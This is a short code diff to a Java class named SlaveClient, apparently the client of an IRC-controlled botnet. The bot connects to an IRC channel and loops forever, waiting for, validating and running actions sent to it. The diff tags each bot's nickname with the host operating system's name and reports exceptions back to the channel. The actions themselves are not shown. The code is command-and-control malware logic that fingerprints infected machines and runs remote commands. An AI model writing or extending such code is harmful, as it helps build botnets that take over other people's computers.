@@ -18,7 +18,8 @@ public class SlaveClient {
 
     public static void main(String[] args) throws Exception {
 
-        setNickAndLogin(getRandomNumber());
+
+        setNickAndLogin(getRandomNumber(), getSystemName());
         Bot bot1 = new Bot(server, nick, login, channel);
 
         while(true)
@@ -26,18 +27,25 @@ public class SlaveClient {
             bot1.connectToIRC();
 
             while (true) {
-                bot1.waitAndValidateAction();
-                bot1.runAction();
+                try
+                {
+                    bot1.waitAndValidateAction();
+                    bot1.runAction();
+                }
+                catch (Exception e)
+                {
+                    bot1.sendMessage(e.getMessage());
+                }
             }
         }
     }
 
-    private static void setNickAndLogin(int randomNumber)
+    private static void setNickAndLogin(int randomNumber, String system)
     {
         String number = Integer.toString(randomNumber);
         System.out.println("BOT_NO:" + number);
-        nick = nick.concat(number);
-        login = login.concat(number);
+        nick = nick.concat(number).concat(system);
+        login = nick;
     }
 
     private static int getRandomNumber()
@@ -46,7 +54,10 @@ public class SlaveClient {
         return randomGenerator.nextInt(9999);
     }
 
-
+    private static String getSystemName()
+    {
+        return System.getProperty("os.name").substring(0,3).toLowerCase();
+    }
 
 
 }
